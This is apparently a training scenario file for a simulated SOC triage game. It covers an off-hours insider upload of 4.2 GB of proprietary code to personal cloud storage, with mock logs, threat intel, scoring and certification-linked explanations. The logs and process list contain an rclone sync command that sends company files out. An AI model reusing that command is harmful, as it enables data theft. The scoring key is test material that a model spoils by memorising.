@@ -1,0 +1,155 @@
+{
+  "id": "SCENARIO_INSIDER_EXFIL_01",
+  "title": "Off-Hours Multi-Gigabyte Data Exfiltration by Privileged Insider",
+  "category": "insider_threat",
+  "severity": "Critical",
+  "trigger_time_offset": 80,
+  "source_ip": "10.0.1.55",
+  "destination_ip": "104.244.42.1",
+  "destination_port": "443 (HTTPS / Cloud Storage)",
+  "protocol": "TLS / TCP",
+  "rule_fired": "DLP_NETFLOW_MASSIVE_OUTBOUND_DATA_SPIKE_OFF_HOURS",
+  "hostname": "WS-ENG-SENIOR02.corp",
+  "summary": "Anomalous high-bandwidth data egress detected at 03:15 AM local time. Internal engineering workstation WS-ENG-SENIOR02 initiated an unapproved 4.2 GB data transfer to personal cloud storage endpoint using rclone CLI utility over an active VPN tunnel.",
+  "raw_logs": [
+    "2026-10-09T03:14:02Z CISCO_ANYCONNECT_VPN: User='k.ross' ClientIP=172.56.21.90 AssignedIP=10.0.1.55 AuthType=MFA_Push Geolocation='Residential Broadband' LoginTime=OFF_HOURS (Standard shift: 09:00-17:00)",
+    "2026-10-09T03:15:10Z CISCO_NETFLOW: FlowRecord SrcIP=10.0.1.55 DstIP=104.244.42.1 DstPort=443 Proto=6 Packets=2910404 BytesSent=4512984120 Duration=740s Rate=48.8Mbps",
+    "2026-10-09T03:15:12Z SQUID_PROXY: CONNECT s3-external-share.wasabisys.com:443 HTTP/1.1 200 BytesSent=4294967296 UserAgent='rclone/v1.64.0' Category='Personal Cloud Storage / Shadow IT'",
+    "2026-10-09T03:15:15Z SYSMON[1]: EventID=1 Image='C:\\Users\\k.ross\\AppData\\Local\\Temp\\rclone.exe' CommandLine='rclone.exe sync D:\\Proprietary_Engine_V4 wasabi:personal-vault-stash --transfers 8' User='CORP\\k.ross'",
+    "2026-10-09T03:15:20Z PALO_ALTO_PAN_OS: ThreatID=90112 (Data Exfiltration: Multi-part archive upload) Action=Alert Severity=High SrcZone=Trust DstZone=Untrust Bytes=4.2GB"
+  ],
+  "logs_categorized": {
+    "firewall": [
+      "2026-10-09T03:15:10Z CISCO_NETFLOW: SrcIP=10.0.1.55 DstIP=104.244.42.1 DstPort=443 Proto=6 BytesSent=4512984120 Duration=740s",
+      "2026-10-09T03:15:20Z PALO_ALTO: ThreatID=90112 (Data Exfiltration: Multi-part upload) Action=Alert Bytes=4.2GB"
+    ],
+    "auth": [
+      "2026-10-09T03:14:02Z CISCO_VPN: User=k.ross AssignedIP=10.0.1.55 LoginTime=OFF_HOURS (03:14 AM)",
+      "2026-10-09T03:14:45Z GITLAB_AUDIT: User=k.ross Action=ARCHIVE_DOWNLOAD Repo=core-firmware-intellectual-property Format=tar.gz IP=10.0.1.55"
+    ],
+    "proxy": [
+      "2026-10-09T03:15:12Z SQUID_PROXY: CONNECT s3-external-share.wasabisys.com:443 200 BytesSent=4.2GB UserAgent='rclone/v1.64.0' Category='Shadow IT'"
+    ],
+    "dns": [
+      "2026-10-09T03:15:08Z PIHOLE_DNS: Client=10.0.1.55 Query=s3-external-share.wasabisys.com Answer=104.244.42.1 TTL=300"
+    ]
+  },
+  "pcap_packets": [
+    {
+      "no": 1,
+      "time": "0.000000",
+      "delta": "0.000",
+      "source": "10.0.1.55",
+      "destination": "104.244.42.1",
+      "protocol": "TLSv1.3",
+      "length": 1460,
+      "flags": "[PSH, ACK]",
+      "info": "Application Data (Multi-part S3 Object Upload Chunk 0x0001 - 1408 bytes)",
+      "payload_preview": "17 03 03 05 78 a1 b2 c3 ... [ENCRYPTED S3 MULTI-PART ARCHIVE STREAM]",
+      "details": {
+        "layer_eth": "Source: 00:50:56:a1:44:99, Destination: 00:0c:29:84:11:02",
+        "layer_ip": "IPv4: 10.0.1.55 -> 104.244.42.1, TTL=128",
+        "layer_trans": "TCP: Port 51840 -> 443 (HTTPS)",
+        "layer_app": "TLS Application Data: Outbound stream throughput saturating 50 Mbps uplink."
+      }
+    },
+    {
+      "no": 2,
+      "time": "0.002100",
+      "delta": "0.002",
+      "source": "10.0.1.55",
+      "destination": "104.244.42.1",
+      "protocol": "TLSv1.3",
+      "length": 1460,
+      "flags": "[PSH, ACK]",
+      "info": "Application Data (Multi-part S3 Object Upload Chunk 0x0002 - 1408 bytes)",
+      "payload_preview": "17 03 03 05 78 b2 c3 d4 ... [CONTINUOUS HIGH-VELOCITY EXFILTRATION STREAM]",
+      "details": {
+        "layer_eth": "Source: 00:50:56:a1:44:99, Destination: 00:0c:29:84:11:02",
+        "layer_ip": "IPv4: 10.0.1.55 -> 104.244.42.1",
+        "layer_trans": "TCP: Port 51840 -> 443",
+        "layer_app": "Rapid uninterrupted stream of full MSS packets transmitting proprietary files."
+      }
+    }
+  ],
+  "threat_intel": {
+    "104.244.42.1": {
+      "ip": "104.244.42.1",
+      "reputation_score": 45,
+      "verdict": "Unsanctioned Cloud Storage / Shadow IT",
+      "threat_level": "SUSPICIOUS / SHADOW IT",
+      "asn": "AS54888 (Wasabi Technologies LLC)",
+      "country": "US",
+      "domain": "s3-external-share.wasabisys.com",
+      "threat_types": ["Public S3 Cloud Storage Bucket", "Unapproved Shadow IT Storage"],
+      "passive_dns_count": 412,
+      "first_seen": "2024-02-10",
+      "reports_summary": "Legitimate low-cost cloud storage provider frequently exploited by malicious insiders and ransomware actors for unmonitored mass data staging."
+    },
+    "10.0.1.55": {
+      "ip": "10.0.1.55",
+      "reputation_score": 0,
+      "verdict": "Internal Corporate Engineering Host",
+      "threat_level": "CLEAN",
+      "asn": "RFC 1918 Private Address Space",
+      "country": "LOCAL",
+      "domain": "WS-ENG-SENIOR02.corp",
+      "threat_types": ["Senior Staff Workstation"],
+      "passive_dns_count": 0,
+      "first_seen": "2023-04-10",
+      "reports_summary": "Assigned to principal software engineer K. Ross. Has administrative access to source code repositories."
+    }
+  },
+  "endpoint_processes": [
+    {
+      "pid": 1102,
+      "ppid": 480,
+      "name": "explorer.exe",
+      "user": "CORP\\k.ross",
+      "command": "C:\\Windows\\explorer.exe",
+      "status": "Running",
+      "hash": "c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3",
+      "integrity": "Medium"
+    },
+    {
+      "pid": 5892,
+      "ppid": 1102,
+      "name": "cmd.exe",
+      "user": "CORP\\k.ross",
+      "command": "cmd.exe /k",
+      "status": "Running",
+      "hash": "2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c",
+      "integrity": "Medium"
+    },
+    {
+      "pid": 6014,
+      "ppid": 5892,
+      "name": "rclone.exe",
+      "user": "CORP\\k.ross",
+      "command": "C:\\Users\\k.ross\\AppData\\Local\\Temp\\rclone.exe sync D:\\Proprietary_Engine_V4 wasabi:personal-vault-stash --transfers 8",
+      "status": "Running",
+      "hash": "6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b",
+      "integrity": "Medium",
+      "note": "UNSANCTIONED EXFILTRATION TOOL: rclone binary executing from Temp directory to sync proprietary source repos to personal bucket."
+    }
+  ],
+  "optimal_action": "Isolate Host",
+  "acceptable_actions": ["Block IP", "Escalate"],
+  "scoring": {
+    "Isolate Host": 160,
+    "Block IP": 80,
+    "Escalate": 75,
+    "Dismiss": -320
+  },
+  "feedback": {
+    "Isolate Host": "CRITICAL CONTAINMENT SUCCESS: WS-ENG-SENIOR02 isolated immediately via EDR! Off-hours NetFlow volume telemetry (4.2 GB egress) combined with the rclone process execution confirmed an unauthorized insider exfiltration event. Host isolation severed the transfer before the full intellectual property archive could be stolen.",
+    "Block IP": "PARTIAL MITIGATION: Blocked external Wasabi IP at perimeter firewall. However, the insider retained active host control on the workstation and can re-route the transfer to personal Google Drive, Dropbox, or a USB mass storage device without endpoint network isolation.",
+    "Escalate": "ACCEPTABLE: Escalated to Tier 2 SOC and HR/Legal Incident Response. In massive active data egress, isolating the host immediately stops file loss, but escalation ensures digital forensics preserves chain of custody.",
+    "Dismiss": "CATASTROPHIC BREACH: Dismissed as regular remote work! Disgruntled engineer successfully exfiltrated the entire company proprietary software codebase to a competitor."
+  },
+  "educational_rationale": {
+    "topic": "User and Entity Behavior Analytics (UEBA), NetFlow Baselines & Insider Threat Detection",
+    "certification_relevance": "Security+ SY0-701 (Section 2.3 Threat Actors - Insiders, Section 4.2 Incident Response Analysis) & Network+ (Section 5.3 NetFlow & Traffic Flow Monitoring)",
+    "deep_dive": "Insider threats are challenging because the perpetrator possesses legitimate domain credentials and authorized access to files. Traditional signature AV will not trigger on file reads. Detection relies on User & Entity Behavior Analytics (UEBA) and NetFlow baseline deviation: (1) Temporal Anomaly: VPN connection and gigabyte-scale transfers occurring at 03:15 AM outside standard shift hours; (2) Volume Anomaly: Standard daily workstation egress is under 50 MB, but NetFlow logs 4.2 GB in 12 minutes; (3) Tooling Anomaly: Execution of cloud sync binaries like 'rclone' from user Temp directories directed toward unapproved cloud storage providers."
+  }
+}
